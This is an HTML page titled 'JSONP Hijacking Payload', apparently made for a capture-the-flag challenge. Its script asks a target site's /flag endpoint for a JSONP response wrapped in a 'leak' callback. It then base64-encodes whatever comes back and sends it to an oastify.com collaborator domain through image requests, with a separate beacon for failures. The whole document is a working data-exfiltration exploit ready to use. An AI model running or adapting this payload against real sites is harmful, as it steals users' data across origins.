<!DOCTYPE html>
<html>
<head>
    <title>JSONP Hijacking Payload</title>
</head>
<body>
    <h1>Attempting JSONP exploit...</h1>
    <script>
        // --- CONFIGURATION ---
        const targetHost = "https://tar-award-writers-controllers.trycloudflare.com";
        const collaboratorDomain = "8hq06s646m3p2dcne2pxwuggp7vzjp7e.oastify.com"; // <-- IMPORTANT: Change this!

        // 1. Define the global callback function that the server will hopefully call.
        //    The name "leak" is arbitrary.
        function leak(data) {
            // If this function is called, 'data' contains the flag.
            // It might be a string or an object, so we stringify it.
            const flag = JSON.stringify(data);
            
            // Exfiltrate the captured data.
            const encodedFlag = btoa(flag.trim());
            new Image().src = `https://flag-${encodedFlag}.${collaboratorDomain}`;
        }

        // 2. Create a <script> tag to try and trigger the JSONP response.
        const script = document.createElement('script');

        // 3. Set the source to the target, adding the callback parameter.
        //    This tells the server to wrap the response in the "leak" function.
        script.src = `${targetHost}/flag?callback=leak`;

        // 4. Set an error handler. If this runs, the JSONP attempt failed.
        script.onerror = function() {
            const encodedError = btoa("jsonp-failed-or-not-supported");
            new Image().src = `https://error-${encodedError}.${collaboratorDomain}`;
        };

        // 5. Add the script to the page to make the browser request it.
        document.head.appendChild(script);
    </script>
</body>
</html>
